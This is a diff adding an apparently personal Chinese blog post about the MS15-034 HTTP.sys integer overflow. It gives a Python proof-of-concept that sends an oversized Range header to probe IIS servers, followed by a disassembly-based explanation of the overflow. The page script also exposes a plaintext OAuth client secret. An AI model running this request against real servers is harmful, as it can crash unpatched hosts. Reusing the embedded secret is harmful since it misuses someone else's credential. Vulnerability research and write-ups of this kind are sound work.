@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>Y11en</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+<header class="header">
+    <div class="header-inner">
+        <div class="header-title">
+
+        </div>
+        <nav class="header-nav">
+            
+            <a href="/" class="header-nav-link" >
+                首页
+            </a>
+            
+
+            
+            <a href="/archives" class="header-nav-link">
+                归档
+            </a>
+            
+
+            
+            <a href="/tags" class="header-nav-link">
+                标签
+            </a>
+            
+
+            
+            <a href="/about/" class="header-nav-link">
+                关于
+            </a>
+            
+        </nav>
+    </div>
+</header>
+<header class="mobile-header">
+    <div class="mobile-nav">
+        <div class="mobile-nav-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="mobile-nav-title">
+            <a href="/" class="mobile-nav-title-link">y11en's Blog</a>
+        </div>
+
+    </div>
+    <nav class="mobile-menu">
+        <ul class="mobile-menu-list">
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-home"></i>
+                <a href="/" class="mobile-nav-link">首页</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-archive"></i>
+                <a href="/archives" class="mobile-nav-link">归档</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-tag"></i>
+                <a href="/tags" class="mobile-nav-link">标签</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-about"></i>
+                <a href="/about/" class="mobile-nav-link">关于</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<div class="main">
+    <div class="content-inner">
+        <div class="posts">
+    <article class="post-whole">
+        <div class="post-title">
+            <h2 class="title">MS15-034 HTTP.sys 远程执行代码</h2>
+            <div class="post-meta">
+                <span class="post-time">2015-09-16</span>
+				
+                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
+            </div>
+        </div>
+        <div class="post-toc" id="post-toc">
+    <strong class="post-toc-title">目录</strong>
+    
+    <div class="back-to-top" id="back-to-top">
+        <a href="javascript:void(0);">回到顶部</a>
+    </div>
+</div>
+        <div class="post-content">
+            <p><strong>现在最多造成蓝屏</strong></p>
+<p><strong>POC</strong></p>
+<blockquote>
+<p>import socket</p>
+<p>import random</p>
+<p>ipAddr =&quot;WebSite&quot;</p>
+<p>hexAllFfff =&quot;18446744073709551615&quot;</p>
+<p>count=0</p>
+<p>req1 =&quot;GET/ HTTP/1.0\r\n\r\n&quot;</p>
+<p>req =&quot;GET/ HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;+str(count)+&quot;-&quot;+ hexAllFfff +&quot;\r\n\r\n&quot;</p>
+<p>print &quot;[*] Audit Started&quot;</p>
+<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>client_socket.connect((ipAddr, 80))</p>
+<p>client_socket.send(req1)</p>
+<p>boringResp = client_socket.recv(1024)</p>
+<p>if &quot;Microsoft&quot; not in boringResp:</p>
+<p>print &quot;[*] Not IIS&quot;</p>
+<p>exit(0)</p>
+<p>client_socket.close()</p>
+<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>client_socket.connect((ipAddr, 80))</p>
+<p>client_socket.send(req)</p>
+<p>goodResp = client_socket.recv(1024)</p>
+<p>if &quot;Requested Range Not Satisfiable&quot; in goodResp:</p>
+<p>print &quot;[!!] Looks VULN&quot;</p>
+<p>elif &quot; The request has an invalid header name&quot; in goodResp:</p>
+<p>print &quot;[*] Looks Patched&quot;</p>
+<p>else:</p>
+<p>print &quot;[*] Unexpected response, cannot discern patch status&quot;</p>
+<p>print goodResp </p>
+</blockquote>
+<p>**<br>**</p>
+<p><strong>漏洞原理：</strong></p>
+<p><strong>HTTP.sys 在处理内核缓存数据时，</strong></p>
+<p>**<br>**</p>
+<blockquote>
+<p>8a8b2112 56  push esi<br>8a8b2113 6a00  push 0<br>8a8b2115 2bc7  sub eax,edi<br>8a8b2117 6a01  push 1<br>8a8b2119 1bca  sbb ecx,edx<br>8a8b211b 51  push ecx<br>8a8b211c 50  push eax<br>8a8b211d e8bf69fbff call HTTP!RtlULongLongAdd (8a868ae1); here**<br>** </p>
+</blockquote>
+<p>**<br>**</p>
+<p><strong>eax1 = eax - edi</strong></p>
+<p><strong>ecx1 = ecx - edx</strong></p>
+<p><strong>RtlULongLongAdd (eax1, ecx1)</strong></p>
+<p>**<br>**</p>
+<p>其中 eax1 与 ecx1 是处理 HTTP 请求中</p>
+<blockquote>
+<p>Range: bytes=&quot;+<strong>offsetlow</strong>+&quot;-&quot;+<strong>offsethigh</strong>+&quot;\r\n\r\n&quot; </p>
+</blockquote>
+<p><strong>当offsetlow = 0 ,offsethigh= 0xFFFFFFFFFFFFFFFF</strong></p>
+<p><strong>时经过 RtlULongLongAdd 操作</strong></p>
+<p><strong>0xFFFFFFFFFFFFFFFF+ 0 + 1 = 0 造成整数溢出</strong></p>
+<p>&nbsp;</p>
+
+        </div>
+        
+        <div class="post-tag">
+            
+            <a class="tag" href="/tags/POC/" title="POC">POC</a>
+            
+        </div>
+        
+    </article>
+</div>
+<div class="paginator">
+    
+        
+            <a class="prev" href="/2015/10/03/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/">
+                <i class="iconfont icon-prev"></i>
+                <span class="nav-default">主动防御技术浅析</span>
+                <span class="nav-mobile">上一篇</span>
+            </a>
+        
+        
+    
+</div>
+<div id="comment-container"></div>
+    </div>
+</div>
+<footer class="footer-social">
+    
+    <a class="social-link" target="_blank" href="https://github.com/y11en">
+        <i class="iconfont icon-github"></i>
+    </a>
+    
+
+    
+
+    
+
+    <div class="footer-copyright">
+        <p class="time-line">
+            &copy;
+            
+            
+                2015 -
+            
+            2020
+            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
+            <a target="_blank" href="https://github.com/iJinxin">y11en</a>
+        </p>
+        <p class="theme-info">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
+            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
+        </p>
+    </div>
+</footer>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    
+    var gitment = new Gitment({
+        id: 'MS15-034 HTTP.sys 远程执行代码',
+        owner: 'y11en',
+        repo: 'blog_r3_comment',
+        oauth: {
+            client_id: '5049946d5d3f1d55996d',
+            client_secret: 'ebe785ea8e3f9b280d57a372588af2a202f0638c'
+        }
+    });
+    gitment.render('comment-container');
+    
+
+</script>
+</html>
